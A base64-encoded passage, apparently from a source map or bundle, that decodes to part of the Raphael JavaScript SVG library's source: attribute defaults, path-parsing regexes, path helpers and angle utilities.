CAgICAgIFwiY2xpcC1yZWN0XCI6IFwiMCAwIDFlOSAxZTlcIixcbiAgICAgICAgICAgIGN1cnNvcjogXCJkZWZhdWx0XCIsXG4gICAgICAgICAgICBjeDogMCxcbiAgICAgICAgICAgIGN5OiAwLFxuICAgICAgICAgICAgZmlsbDogXCIjZmZmXCIsXG4gICAgICAgICAgICBcImZpbGwtb3BhY2l0eVwiOiAxLFxuICAgICAgICAgICAgZm9udDogJzEwcHggXCJBcmlhbFwiJyxcbiAgICAgICAgICAgIFwiZm9udC1mYW1pbHlcIjogJ1wiQXJpYWxcIicsXG4gICAgICAgICAgICBcImZvbnQtc2l6ZVwiOiBcIjEwXCIsXG4gICAgICAgICAgICBcImZvbnQtc3R5bGVcIjogXCJub3JtYWxcIixcbiAgICAgICAgICAgIFwiZm9udC13ZWlnaHRcIjogNDAwLFxuICAgICAgICAgICAgZ3JhZGllbnQ6IDAsXG4gICAgICAgICAgICBoZWlnaHQ6IDAsXG4gICAgICAgICAgICBocmVmOiBcImh0dHA6Ly9yYXBoYWVsanMuY29tL1wiLFxuICAgICAgICAgICAgXCJsZXR0ZXItc3BhY2luZ1wiOiAwLFxuICAgICAgICAgICAgb3BhY2l0eTogMSxcbiAgICAgICAgICAgIHBhdGg6IFwiTTAsMFwiLFxuICAgICAgICAgICAgcjogMCxcbiAgICAgICAgICAgIHJ4OiAwLFxuICAgICAgICAgICAgcnk6IDAsXG4gICAgICAgICAgICBzcmM6IFwiXCIsXG4gICAgICAgICAgICBzdHJva2U6IFwiIzAwMFwiLFxuICAgICAgICAgICAgXCJzdHJva2UtZGFzaGFycmF5XCI6IFwiXCIsXG4gICAgICAgICAgICBcInN0cm9rZS1saW5lY2FwXCI6IFwiYnV0dFwiLFxuICAgICAgICAgICAgXCJzdHJva2UtbGluZWpvaW5cIjogXCJidXR0XCIsXG4gICAgICAgICAgICBcInN0cm9rZS1taXRlcmxpbWl0XCI6IDAsXG4gICAgICAgICAgICBcInN0cm9rZS1vcGFjaXR5XCI6IDEsXG4gICAgICAgICAgICBcInN0cm9rZS13aWR0aFwiOiAxLFxuICAgICAgICAgICAgdGFyZ2V0OiBcIl9ibGFua1wiLFxuICAgICAgICAgICAgXCJ0ZXh0LWFuY2hvclwiOiBcIm1pZGRsZVwiLFxuICAgICAgICAgICAgdGl0bGU6IFwiUmFwaGFlbFwiLFxuICAgICAgICAgICAgdHJhbnNmb3JtOiBcIlwiLFxuICAgICAgICAgICAgd2lkdGg6IDAsXG4gICAgICAgICAgICB4OiAwLFxuICAgICAgICAgICAgeTogMCxcbiAgICAgICAgICAgIFwiY2xhc3NcIjogXCJcIlxuICAgICAgICB9LFxuICAgICAgICBhdmFpbGFibGVBbmltQXR0cnMgPSBSLl9hdmFpbGFibGVBbmltQXR0cnMgPSB7XG4gICAgICAgICAgICBibHVyOiBudSxcbiAgICAgICAgICAgIFwiY2xpcC1yZWN0XCI6IFwiY3N2XCIsXG4gICAgICAgICAgICBjeDogbnUsXG4gICAgICAgICAgICBjeTogbnUsXG4gICAgICAgICAgICBmaWxsOiBcImNvbG91clwiLFxuICAgICAgICAgICAgXCJmaWxsLW9wYWNpdHlcIjogbnUsXG4gICAgICAgICAgICBcImZvbnQtc2l6ZVwiOiBudSxcbiAgICAgICAgICAgIGhlaWdodDogbnUsXG4gICAgICAgICAgICBvcGFjaXR5OiBudSxcbiAgICAgICAgICAgIHBhdGg6IFwicGF0aFwiLFxuICAgICAgICAgICAgcjogbnUsXG4gICAgICAgICAgICByeDogbnUsXG4gICAgICAgICAgICByeTogbnUsXG4gICAgICAgICAgICBzdHJva2U6IFwiY29sb3VyXCIsXG4gICAgICAgICAgICBcInN0cm9rZS1vcGFjaXR5XCI6IG51LFxuICAgICAgICAgICAgXCJzdHJva2Utd2lkdGhcIjogbnUsXG4gICAgICAgICAgICB0cmFuc2Zvcm06IFwidHJhbnNmb3JtXCIsXG4gICAgICAgICAgICB3aWR0aDogbnUsXG4gICAgICAgICAgICB4OiBudSxcbiAgICAgICAgICAgIHk6IG51XG4gICAgICAgIH0sXG4gICAgICAgIHdoaXRlc3BhY2UgPSAvW1xceDA5XFx4MGFcXHgwYlxceDBjXFx4MGRcXHgyMFxceGEwXFx1MTY4MFxcdTE4MGVcXHUyMDAwXFx1MjAwMVxcdTIwMDJcXHUyMDAzXFx1MjAwNFxcdTIwMDVcXHUyMDA2XFx1MjAwN1xcdTIwMDhcXHUyMDA5XFx1MjAwYVxcdTIwMmZcXHUyMDVmXFx1MzAwMFxcdTIwMjhcXHUyMDI5XS9nLFxuICAgICAgICBjb21tYVNwYWNlcyA9IC9bXFx4MDlcXHgwYVxceDBiXFx4MGNcXHgwZFxceDIwXFx4YTBcXHUxNjgwXFx1MTgwZVxcdTIwMDBcXHUyMDAxXFx1MjAwMlxcdTIwMDNcXHUyMDA0XFx1MjAwNVxcdTIwMDZcXHUyMDA3XFx1MjAwOFxcdTIwMDlcXHUyMDBhXFx1MjAyZlxcdTIwNWZcXHUzMDAwXFx1MjAyOFxcdTIwMjldKixbXFx4MDlcXHgwYVxceDBiXFx4MGNcXHgwZFxceDIwXFx4YTBcXHUxNjgwXFx1MTgwZVxcdTIwMDBcXHUyMDAxXFx1MjAwMlxcdTIwMDNcXHUyMDA0XFx1MjAwNVxcdTIwMDZcXHUyMDA3XFx1MjAwOFxcdTIwMDlcXHUyMDBhXFx1MjAyZlxcdTIwNWZcXHUzMDAwXFx1MjAyOFxcdTIwMjldKi8sXG4gICAgICAgIGhzcmcgPSB7aHM6IDEsIHJnOiAxfSxcbiAgICAgICAgcDJzID0gLyw/KFthY2hsbXFyc3R2eHpdKSw/L2dpLFxuICAgICAgICBwYXRoQ29tbWFuZCA9IC8oW2FjaGxtcnFzdHZ6XSlbXFx4MDlcXHgwYVxceDBiXFx4MGNcXHgwZFxceDIwXFx4YTBcXHUxNjgwXFx1MTgwZVxcdTIwMDBcXHUyMDAxXFx1MjAwMlxcdTIwMDNcXHUyMDA0XFx1MjAwNVxcdTIwMDZcXHUyMDA3XFx1MjAwOFxcdTIwMDlcXHUyMDBhXFx1MjAyZlxcdTIwNWZcXHUzMDAwXFx1MjAyOFxcdTIwMjksXSooKC0/XFxkKlxcLj9cXGQqKD86ZVtcXC0rXT9cXGQrKT9bXFx4MDlcXHgwYVxceDBiXFx4MGNcXHgwZFxceDIwXFx4YTBcXHUxNjgwXFx1MTgwZVxcdTIwMDBcXHUyMDAxXFx1MjAwMlxcdTIwMDNcXHUyMDA0XFx1MjAwNVxcdTIwMDZcXHUyMDA3XFx1MjAwOFxcdTIwMDlcXHUyMDBhXFx1MjAyZlxcdTIwNWZcXHUzMDAwXFx1MjAyOFxcdTIwMjldKiw/W1xceDA5XFx4MGFcXHgwYlxceDBjXFx4MGRcXHgyMFxceGEwXFx1MTY4MFxcdTE4MGVcXHUyMDAwXFx1MjAwMVxcdTIwMDJcXHUyMDAzXFx1MjAwNFxcdTIwMDVcXHUyMDA2XFx1MjAwN1xcdTIwMDhcXHUyMDA5XFx1MjAwYVxcdTIwMmZcXHUyMDVmXFx1MzAwMFxcdTIwMjhcXHUyMDI5XSopKykvaWcsXG4gICAgICAgIHRDb21tYW5kID0gLyhbcnN0bV0pW1xceDA5XFx4MGFcXHgwYlxceDBjXFx4MGRcXHgyMFxceGEwXFx1MTY4MFxcdTE4MGVcXHUyMDAwXFx1MjAwMVxcdTIwMDJcXHUyMDAzXFx1MjAwNFxcdTIwMDVcXHUyMDA2XFx1MjAwN1xcdTIwMDhcXHUyMDA5XFx1MjAwYVxcdTIwMmZcXHUyMDVmXFx1MzAwMFxcdTIwMjhcXHUyMDI5LF0qKCgtP1xcZCpcXC4/XFxkKig/OmVbXFwtK10/XFxkKyk/W1xceDA5XFx4MGFcXHgwYlxceDBjXFx4MGRcXHgyMFxceGEwXFx1MTY4MFxcdTE4MGVcXHUyMDAwXFx1MjAwMVxcdTIwMDJcXHUyMDAzXFx1MjAwNFxcdTIwMDVcXHUyMDA2XFx1MjAwN1xcdTIwMDhcXHUyMDA5XFx1MjAwYVxcdTIwMmZcXHUyMDVmXFx1MzAwMFxcdTIwMjhcXHUyMDI5XSosP1tcXHgwOVxceDBhXFx4MGJcXHgwY1xceDBkXFx4MjBcXHhhMFxcdTE2ODBcXHUxODBlXFx1MjAwMFxcdTIwMDFcXHUyMDAyXFx1MjAwM1xcdTIwMDRcXHUyMDA1XFx1MjAwNlxcdTIwMDdcXHUyMDA4XFx1MjAwOVxcdTIwMGFcXHUyMDJmXFx1MjA1ZlxcdTMwMDBcXHUyMDI4XFx1MjAyOV0qKSspL2lnLFxuICAgICAgICBwYXRoVmFsdWVzID0gLygtP1xcZCpcXC4/XFxkKig/OmVbXFwtK10/XFxkKyk/KVtcXHgwOVxceDBhXFx4MGJcXHgwY1xceDBkXFx4MjBcXHhhMFxcdTE2ODBcXHUxODBlXFx1MjAwMFxcdTIwMDFcXHUyMDAyXFx1MjAwM1xcdTIwMDRcXHUyMDA1XFx1MjAwNlxcdTIwMDdcXHUyMDA4XFx1MjAwOVxcdTIwMGFcXHUyMDJmXFx1MjA1ZlxcdTMwMDBcXHUyMDI4XFx1MjAyOV0qLD9bXFx4MDlcXHgwYVxceDBiXFx4MGNcXHgwZFxceDIwXFx4YTBcXHUxNjgwXFx1MTgwZVxcdTIwMDBcXHUyMDAxXFx1MjAwMlxcdTIwMDNcXHUyMDA0XFx1MjAwNVxcdTIwMDZcXHUyMDA3XFx1MjAwOFxcdTIwMDlcXHUyMDBhXFx1MjAyZlxcdTIwNWZcXHUzMDAwXFx1MjAyOFxcdTIwMjldKi9pZyxcbiAgICAgICAgcmFkaWFsX2dyYWRpZW50ID0gUi5fcmFkaWFsX2dyYWRpZW50ID0gL15yKD86XFwoKFteLF0rPylbXFx4MDlcXHgwYVxceDBiXFx4MGNcXHgwZFxceDIwXFx4YTBcXHUxNjgwXFx1MTgwZVxcdTIwMDBcXHUyMDAxXFx1MjAwMlxcdTIwMDNcXHUyMDA0XFx1MjAwNVxcdTIwMDZcXHUyMDA3XFx1MjAwOFxcdTIwMDlcXHUyMDBhXFx1MjAyZlxcdTIwNWZcXHUzMDAwXFx1MjAyOFxcdTIwMjldKixbXFx4MDlcXHgwYVxceDBiXFx4MGNcXHgwZFxceDIwXFx4YTBcXHUxNjgwXFx1MTgwZVxcdTIwMDBcXHUyMDAxXFx1MjAwMlxcdTIwMDNcXHUyMDA0XFx1MjAwNVxcdTIwMDZcXHUyMDA3XFx1MjAwOFxcdTIwMDlcXHUyMDBhXFx1MjAyZlxcdTIwNWZcXHUzMDAwXFx1MjAyOFxcdTIwMjldKihbXlxcKV0rPylcXCkpPy8sXG4gICAgICAgIGVsZGF0YSA9IHt9LFxuICAgICAgICBzb3J0QnlLZXkgPSBmdW5jdGlvbiAoYSwgYikge1xuICAgICAgICAgICAgcmV0dXJuIGEua2V5IC0gYi5rZXk7XG4gICAgICAgIH0sXG4gICAgICAgIHNvcnRCeU51bWJlciA9IGZ1bmN0aW9uIChhLCBiKSB7XG4gICAgICAgICAgICByZXR1cm4gdG9GbG9hdChhKSAtIHRvRmxvYXQoYik7XG4gICAgICAgIH0sXG4gICAgICAgIGZ1biA9IGZ1bmN0aW9uICgpIHt9LFxuICAgICAgICBwaXBlID0gZnVuY3Rpb24gKHgpIHtcbiAgICAgICAgICAgIHJldHVybiB4O1xuICAgICAgICB9LFxuICAgICAgICByZWN0UGF0aCA9IFIuX3JlY3RQYXRoID0gZnVuY3Rpb24gKHgsIHksIHcsIGgsIHIpIHtcbiAgICAgICAgICAgIGlmIChyKSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuIFtbXCJNXCIsIHggKyByLCB5XSwgW1wibFwiLCB3IC0gciAqIDIsIDBdLCBbXCJhXCIsIHIsIHIsIDAsIDAsIDEsIHIsIHJdLCBbXCJsXCIsIDAsIGggLSByICogMl0sIFtcImFcIiwgciwgciwgMCwgMCwgMSwgLXIsIHJdLCBbXCJsXCIsIHIgKiAyIC0gdywgMF0sIFtcImFcIiwgciwgciwgMCwgMCwgMSwgLXIsIC1yXSwgW1wibFwiLCAwLCByICogMiAtIGhdLCBbXCJhXCIsIHIsIHIsIDAsIDAsIDEsIHIsIC1yXSwgW1wielwiXV07XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXR1cm4gW1tcIk1cIiwgeCwgeV0sIFtcImxcIiwgdywgMF0sIFtcImxcIiwgMCwgaF0sIFtcImxcIiwgLXcsIDBdLCBbXCJ6XCJdXTtcbiAgICAgICAgfSxcbiAgICAgICAgZWxsaXBzZVBhdGggPSBmdW5jdGlvbiAoeCwgeSwgcngsIHJ5KSB7XG4gICAgICAgICAgICBpZiAocnkgPT0gbnVsbCkge1xuICAgICAgICAgICAgICAgIHJ5ID0gcng7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXR1cm4gW1tcIk1cIiwgeCwgeV0sIFtcIm1cIiwgMCwgLXJ5XSwgW1wiYVwiLCByeCwgcnksIDAsIDEsIDEsIDAsIDIgKiByeV0sIFtcImFcIiwgcngsIHJ5LCAwLCAxLCAxLCAwLCAtMiAqIHJ5XSwgW1wielwiXV07XG4gICAgICAgIH0sXG4gICAgICAgIGdldFBhdGggPSBSLl9nZXRQYXRoID0ge1xuICAgICAgICAgICAgcGF0aDogZnVuY3Rpb24gKGVsKSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuIGVsLmF0dHIoXCJwYXRoXCIpO1xuICAgICAgICAgICAgfSxcbiAgICAgICAgICAgIGNpcmNsZTogZnVuY3Rpb24gKGVsKSB7XG4gICAgICAgICAgICAgICAgdmFyIGEgPSBlbC5hdHRycztcbiAgICAgICAgICAgICAgICByZXR1cm4gZWxsaXBzZVBhdGgoYS5jeCwgYS5jeSwgYS5yKTtcbiAgICAgICAgICAgIH0sXG4gICAgICAgICAgICBlbGxpcHNlOiBmdW5jdGlvbiAoZWwpIHtcbiAgICAgICAgICAgICAgICB2YXIgYSA9IGVsLmF0dHJzO1xuICAgICAgICAgICAgICAgIHJldHVybiBlbGxpcHNlUGF0aChhLmN4LCBhLmN5LCBhLnJ4LCBhLnJ5KTtcbiAgICAgICAgICAgIH0sXG4gICAgICAgICAgICByZWN0OiBmdW5jdGlvbiAoZWwpIHtcbiAgICAgICAgICAgICAgICB2YXIgYSA9IGVsLmF0dHJzO1xuICAgICAgICAgICAgICAgIHJldHVybiByZWN0UGF0aChhLngsIGEueSwgYS53aWR0aCwgYS5oZWlnaHQsIGEucik7XG4gICAgICAgICAgICB9LFxuICAgICAgICAgICAgaW1hZ2U6IGZ1bmN0aW9uIChlbCkge1xuICAgICAgICAgICAgICAgIHZhciBhID0gZWwuYXR0cnM7XG4gICAgICAgICAgICAgICAgcmV0dXJuIHJlY3RQYXRoKGEueCwgYS55LCBhLndpZHRoLCBhLmhlaWdodCk7XG4gICAgICAgICAgICB9LFxuICAgICAgICAgICAgdGV4dDogZnVuY3Rpb24gKGVsKSB7XG4gICAgICAgICAgICAgICAgdmFyIGJib3ggPSBlbC5fZ2V0QkJveCgpO1xuICAgICAgICAgICAgICAgIHJldHVybiByZWN0UGF0aChiYm94LngsIGJib3gueSwgYmJveC53aWR0aCwgYmJveC5oZWlnaHQpO1xuICAgICAgICAgICAgfSxcbiAgICAgICAgICAgIHNldCA6IGZ1bmN0aW9uKGVsKSB7XG4gICAgICAgICAgICAgICAgdmFyIGJib3ggPSBlbC5fZ2V0QkJveCgpO1xuICAgICAgICAgICAgICAgIHJldHVybiByZWN0UGF0aChiYm94LngsIGJib3gueSwgYmJveC53aWR0aCwgYmJveC5oZWlnaHQpO1xuICAgICAgICAgICAgfVxuICAgICAgICB9LFxuICAgICAgICAvKlxcXG4gICAgICAgICAqIFJhcGhhZWwubWFwUGF0aFxuICAgICAgICAgWyBtZXRob2QgXVxuICAgICAgICAgKipcbiAgICAgICAgICogVHJhbnNmb3JtIHRoZSBwYXRoIHN0cmluZyB3aXRoIGdpdmVuIG1hdHJpeC5cbiAgICAgICAgID4gUGFyYW1ldGVyc1xuICAgICAgICAgLSBwYXRoIChzdHJpbmcpIHBhdGggc3RyaW5nXG4gICAgICAgICAtIG1hdHJpeCAob2JqZWN0KSBzZWUgQE1hdHJpeFxuICAgICAgICAgPSAoc3RyaW5nKSB0cmFuc2Zvcm1lZCBwYXRoIHN0cmluZ1xuICAgICAgICBcXCovXG4gICAgICAgIG1hcFBhdGggPSBSLm1hcFBhdGggPSBmdW5jdGlvbiAocGF0aCwgbWF0cml4KSB7XG4gICAgICAgICAgICBpZiAoIW1hdHJpeCkge1xuICAgICAgICAgICAgICAgIHJldHVybiBwYXRoO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdmFyIHgsIHksIGksIGosIGlpLCBqaiwgcGF0aGk7XG4gICAgICAgICAgICBwYXRoID0gcGF0aDJjdXJ2ZShwYXRoKTtcbiAgICAgICAgICAgIGZvciAoaSA9IDAsIGlpID0gcGF0aC5sZW5ndGg7IGkgPCBpaTsgaSsrKSB7XG4gICAgICAgICAgICAgICAgcGF0aGkgPSBwYXRoW2ldO1xuICAgICAgICAgICAgICAgIGZvciAoaiA9IDEsIGpqID0gcGF0aGkubGVuZ3RoOyBqIDwgamo7IGogKz0gMikge1xuICAgICAgICAgICAgICAgICAgICB4ID0gbWF0cml4LngocGF0aGlbal0sIHBhdGhpW2ogKyAxXSk7XG4gICAgICAgICAgICAgICAgICAgIHkgPSBtYXRyaXgueShwYXRoaVtqXSwgcGF0aGlbaiArIDFdKTtcbiAgICAgICAgICAgICAgICAgICAgcGF0aGlbal0gPSB4O1xuICAgICAgICAgICAgICAgICAgICBwYXRoaVtqICsgMV0gPSB5O1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJldHVybiBwYXRoO1xuICAgICAgICB9O1xuXG4gICAgUi5fZyA9IGc7XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwudHlwZVxuICAgICBbIHByb3BlcnR5IChzdHJpbmcpIF1cbiAgICAgKipcbiAgICAgKiBDYW4gYmUg4oCcU1ZH4oCdLCDigJxWTUzigJ0gb3IgZW1wdHksIGRlcGVuZGluZyBvbiBicm93c2VyIHN1cHBvcnQuXG4gICAgXFwqL1xuICAgIFIudHlwZSA9IChnLndpbi5TVkdBbmdsZSB8fCBnLmRvYy5pbXBsZW1lbnRhdGlvbi5oYXNGZWF0dXJlKFwiaHR0cDovL3d3dy53My5vcmcvVFIvU1ZHMTEvZmVhdHVyZSNCYXNpY1N0cnVjdHVyZVwiLCBcIjEuMVwiKSA/IFwiU1ZHXCIgOiBcIlZNTFwiKTtcbiAgICBpZiAoUi50eXBlID09IFwiVk1MXCIpIHtcbiAgICAgICAgdmFyIGQgPSBnLmRvYy5jcmVhdGVFbGVtZW50KFwiZGl2XCIpLFxuICAgICAgICAgICAgYjtcbiAgICAgICAgZC5pbm5lckhUTUwgPSAnPHY6c2hhcGUgYWRqPVwiMVwiLz4nO1xuICAgICAgICBiID0gZC5maXJzdENoaWxkO1xuICAgICAgICBiLnN0eWxlLmJlaGF2aW9yID0gXCJ1cmwoI2RlZmF1bHQjVk1MKVwiO1xuICAgICAgICBpZiAoIShiICYmIHR5cGVvZiBiLmFkaiA9PSBcIm9iamVjdFwiKSkge1xuICAgICAgICAgICAgcmV0dXJuIChSLnR5cGUgPSBFKTtcbiAgICAgICAgfVxuICAgICAgICBkID0gbnVsbDtcbiAgICB9XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwuc3ZnXG4gICAgIFsgcHJvcGVydHkgKGJvb2xlYW4pIF1cbiAgICAgKipcbiAgICAgKiBgdHJ1ZWAgaWYgYnJvd3NlciBzdXBwb3J0cyBTVkcuXG4gICAgXFwqL1xuICAgIC8qXFxcbiAgICAgKiBSYXBoYWVsLnZtbFxuICAgICBbIHByb3BlcnR5IChib29sZWFuKSBdXG4gICAgICoqXG4gICAgICogYHRydWVgIGlmIGJyb3dzZXIgc3VwcG9ydHMgVk1MLlxuICAgIFxcKi9cbiAgICBSLnN2ZyA9ICEoUi52bWwgPSBSLnR5cGUgPT0gXCJWTUxcIik7XG4gICAgUi5fUGFwZXIgPSBQYXBlcjtcbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5mblxuICAgICBbIHByb3BlcnR5IChvYmplY3QpIF1cbiAgICAgKipcbiAgICAgKiBZb3UgY2FuIGFkZCB5b3VyIG93biBtZXRob2QgdG8gdGhlIGNhbnZhcy4gRm9yIGV4YW1wbGUgaWYgeW91IHdhbnQgdG8gZHJhdyBhIHBpZSBjaGFydCxcbiAgICAgKiB5b3UgY2FuIGNyZWF0ZSB5b3VyIG93biBwaWUgY2hhcnQgZnVuY3Rpb24gYW5kIHNoaXAgaXQgYXMgYSBSYXBoYcOrbCBwbHVnaW4uIFRvIGRvIHRoaXNcbiAgICAgKiB5b3UgbmVlZCB0byBleHRlbmQgdGhlIGBSYXBoYWVsLmZuYCBvYmplY3QuIFlvdSBzaG91bGQgbW9kaWZ5IHRoZSBgZm5gIG9iamVjdCBiZWZvcmUgYVxuICAgICAqIFJhcGhhw6tsIGluc3RhbmNlIGlzIGNyZWF0ZWQsIG90aGVyd2lzZSBpdCB3aWxsIHRha2Ugbm8gZWZmZWN0LiBQbGVhc2Ugbm90ZSB0aGF0IHRoZVxuICAgICAqIGFiaWxpdHkgZm9yIG5hbWVzcGFjZWQgcGx1Z2lucyB3YXMgcmVtb3ZlZCBpbiBSYXBoYWVsIDIuMC4gSXQgaXMgdXAgdG8gdGhlIHBsdWdpbiB0b1xuICAgICAqIGVuc3VyZSBhbnkgbmFtZXNwYWNpbmcgZW5zdXJlcyBwcm9wZXIgY29udGV4dC5cbiAgICAgPiBVc2FnZVxuICAgICB8IFJhcGhhZWwuZm4uYXJyb3cgPSBmdW5jdGlvbiAoeDEsIHkxLCB4MiwgeTIsIHNpemUpIHtcbiAgICAgfCAgICAgcmV0dXJuIHRoaXMucGF0aCggLi4uICk7XG4gICAgIHwgfTtcbiAgICAgfCAvLyBvciBjcmVhdGUgbmFtZXNwYWNlXG4gICAgIHwgUmFwaGFlbC5mbi5teXN0dWZmID0ge1xuICAgICB8ICAgICBhcnJvdzogZnVuY3Rpb24gKCkge+KApn0sXG4gICAgIHwgICAgIHN0YXI6IGZ1bmN0aW9uICgpIHvigKZ9LFxuICAgICB8ICAgICAvLyBldGPigKZcbiAgICAgfCB9O1xuICAgICB8IHZhciBwYXBlciA9IFJhcGhhZWwoMTAsIDEwLCA2MzAsIDQ4MCk7XG4gICAgIHwgLy8gdGhlbiB1c2UgaXRcbiAgICAgfCBwYXBlci5hcnJvdygxMCwgMTAsIDMwLCAzMCwgNSkuYXR0cih7ZmlsbDogXCIjZjAwXCJ9KTtcbiAgICAgfCBwYXBlci5teXN0dWZmLmFycm93KCk7XG4gICAgIHwgcGFwZXIubXlzdHVmZi5zdGFyKCk7XG4gICAgXFwqL1xuICAgIFIuZm4gPSBwYXBlcnByb3RvID0gUGFwZXIucHJvdG90eXBlID0gUi5wcm90b3R5cGU7XG4gICAgUi5faWQgPSAwO1xuICAgIC8qXFxcbiAgICAgKiBSYXBoYWVsLmlzXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBIYW5kZnVsIG9mIHJlcGxhY2VtZW50cyBmb3IgYHR5cGVvZmAgb3BlcmF0b3IuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIG8gKOKApikgYW55IG9iamVjdCBvciBwcmltaXRpdmVcbiAgICAgLSB0eXBlIChzdHJpbmcpIG5hbWUgb2YgdGhlIHR5cGUsIGkuZS4g4oCcc3RyaW5n4oCdLCDigJxmdW5jdGlvbuKAnSwg4oCcbnVtYmVy4oCdLCBldGMuXG4gICAgID0gKGJvb2xlYW4pIGlzIGdpdmVuIHZhbHVlIGlzIG9mIGdpdmVuIHR5cGVcbiAgICBcXCovXG4gICAgUi5pcyA9IGZ1bmN0aW9uIChvLCB0eXBlKSB7XG4gICAgICAgIHR5cGUgPSBsb3dlckNhc2UuY2FsbCh0eXBlKTtcbiAgICAgICAgaWYgKHR5cGUgPT0gXCJmaW5pdGVcIikge1xuICAgICAgICAgICAgcmV0dXJuICFpc25hbltoYXNdKCtvKTtcbiAgICAgICAgfVxuICAgICAgICBpZiAodHlwZSA9PSBcImFycmF5XCIpIHtcbiAgICAgICAgICAgIHJldHVybiBvIGluc3RhbmNlb2YgQXJyYXk7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuICAodHlwZSA9PSBcIm51bGxcIiAmJiBvID09PSBudWxsKSB8fFxuICAgICAgICAgICAgICAgICh0eXBlID09IHR5cGVvZiBvICYmIG8gIT09IG51bGwpIHx8XG4gICAgICAgICAgICAgICAgKHR5cGUgPT0gXCJvYmplY3RcIiAmJiBvID09PSBPYmplY3QobykpIHx8XG4gICAgICAgICAgICAgICAgKHR5cGUgPT0gXCJhcnJheVwiICYmIEFycmF5LmlzQXJyYXkgJiYgQXJyYXkuaXNBcnJheShvKSkgfHxcbiAgICAgICAgICAgICAgICBvYmplY3RUb1N0cmluZy5jYWxsKG8pLnNsaWNlKDgsIC0xKS50b0xvd2VyQ2FzZSgpID09IHR5cGU7XG4gICAgfTtcblxuICAgIGZ1bmN0aW9uIGNsb25lKG9iaikge1xuICAgICAgICBpZiAodHlwZW9mIG9iaiA9PSBcImZ1bmN0aW9uXCIgfHwgT2JqZWN0KG9iaikgIT09IG9iaikge1xuICAgICAgICAgICAgcmV0dXJuIG9iajtcbiAgICAgICAgfVxuICAgICAgICB2YXIgcmVzID0gbmV3IG9iai5jb25zdHJ1Y3RvcjtcbiAgICAgICAgZm9yICh2YXIga2V5IGluIG9iaikgaWYgKG9ialtoYXNdKGtleSkpIHtcbiAgICAgICAgICAgIHJlc1trZXldID0gY2xvbmUob2JqW2tleV0pO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiByZXM7XG4gICAgfVxuXG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwuYW5nbGVcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFJldHVybnMgYW5nbGUgYmV0d2VlbiB0d28gb3IgdGhyZWUgcG9pbnRzXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIHgxIChudW1iZXIpIHggY29vcmQgb2YgZmlyc3QgcG9pbnRcbiAgICAgLSB5MSAobnVtYmVyKSB5IGNvb3JkIG9mIGZpcnN0IHBvaW50XG4gICAgIC0geDIgKG51bWJlcikgeCBjb29yZCBvZiBzZWNvbmQgcG9pbnRcbiAgICAgLSB5MiAobnVtYmVyKSB5IGNvb3JkIG9mIHNlY29uZCBwb2ludFxuICAgICAtIHgzIChudW1iZXIpICNvcHRpb25hbCB4IGNvb3JkIG9mIHRoaXJkIHBvaW50XG4gICAgIC0geTMgKG51bWJlcikgI29wdGlvbmFsIHkgY29vcmQgb2YgdGhpcmQgcG9pbnRcbiAgICAgPSAobnVtYmVyKSBhbmdsZSBpbiBkZWdyZWVzLlxuICAgIFxcKi9cbiAgICBSLmFuZ2xlID0gZnVuY3Rpb24gKHgxLCB5MSwgeDIsIHkyLCB4MywgeTMpIHtcbiAgICAgICAgaWYgKHgzID09IG51bGwpIHtcbiAgICAgICAgICAgIHZhciB4ID0geDEgLSB4MixcbiAgICAgICAgICAgICAgICB5ID0geTEgLSB5MjtcbiAgICAgICAgICAgIGlmICgheCAmJiAheSkge1xuICAgICAgICAgICAgICAgIHJldHVybiAwO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgcmV0dXJuICgxODAgKyBtYXRoLmF0YW4yKC15LCAteCkgKiAxODAgLyBQSSArIDM2MCkgJSAzNjA7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXR1cm4gUi5hbmdsZSh4MSwgeTEsIHgzLCB5MykgLSBSLmFuZ2xlKHgyLCB5MiwgeDMsIHkzKTtcbiAgICAgICAgfVxuICAgIH07XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwucmFkXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBUcmFuc2Zvcm0gYW5nbGUgdG8gcmFkaWFuc1xuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBkZWcgKG51bWJlcikgYW5nbGUgaW4gZGVncmVlc1xuICAgICA9IChudW1iZXIpIGFuZ2xlIGluIHJhZGlhbnMuXG4gICAgXFwqL1xuICAgIFIucmFkID0gZnVuY3Rpb24gKGRlZykge1xuICAgICAgICByZXR1cm4gZGVnICUgMzYwICogUEkgLyAxODA7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5kZWdcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFRyYW5zZm9ybSBhbmdsZSB0byBkZWdyZWVzXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIHJhZCAobnVtYmVyKSBhbmdsZSBpbiByYWRpYW5zXG4gICAgID0gKG51bWJlcikgYW5nbGUgaW4gZGVncmVlcy5cbiAgICBcXCovXG4gICAgUi5kZWcgPSBmdW5jdGlvbiAocmFkKSB7XG4gICAgICAgIHJldHVybiBNYXRoLnJvdW5kICgocmFkICogMTgwIC8gUEklIDM2MCkqIDEwMDApIC8gMTAwMDtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBSYXBoYWVsLnNuYXBUb1xuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogU25hcHMgZ2l2ZW4gdmFsdWUgdG8gZ2l2ZW4gZ3JpZC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gdmFsdWVzIChhcnJheXxudW